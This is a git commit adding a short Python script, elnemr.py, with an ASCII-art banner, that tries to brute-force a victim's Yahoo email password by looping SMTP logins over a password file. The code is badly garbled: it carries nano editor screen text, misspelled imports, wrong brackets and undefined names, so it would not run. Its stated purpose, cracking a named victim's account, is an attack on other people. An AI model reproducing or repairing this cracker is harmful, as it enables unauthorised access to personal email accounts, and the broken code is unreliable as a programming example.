a169554cc28e34550c9d9e5b1bdf521305fc015a
elnemr159 <34989011+elnemr159@users.noreply.github.com>
2018-01-02 16:23:06 +0200

    ElnemR

---
+++ elnemr.py
@@ -0,0 +1,37 @@
+UW PICO 5.09            File: elnemr            Modified
+
+_______  |       |_______  ________ |________  |   /
+|      | |       |       | |      | |    |   | |  /
+|______| |       |       | |______| |    |   | |/
+|        |       |       | |        |    |   | |
+|______  |______ |       | |______  |    |   | |
+
+Import smtlib
+
+smtpserver=smtplib_smtp["smtp.mail.yahoo.com"."465")
+smtpserver=smtplib_smtp["pop.mail.yahoo.com"."995")
+
+useraraw_input["enter the victims email"]
+
+passwordfile=raw_input|"enter the pw file"]
+
+for password in passfile:
+
+
+try"
+    smtpserver.login["user,passw"]
+
+    print("[+] password found====>%s"]
+
+
+
+    break:
+
+
+    except smtplib.smtpAthenticationError
+
+
+    print("{+} password incorrect====>%s"]
+
+^G Get Hel^O WriteOu^R Read Fi^Y Prev Pg^K Cut Tex^C Cur Pos
+^X Exit   ^J Justify^W Where i^V Next Pg^U UnCut T^T To Spe
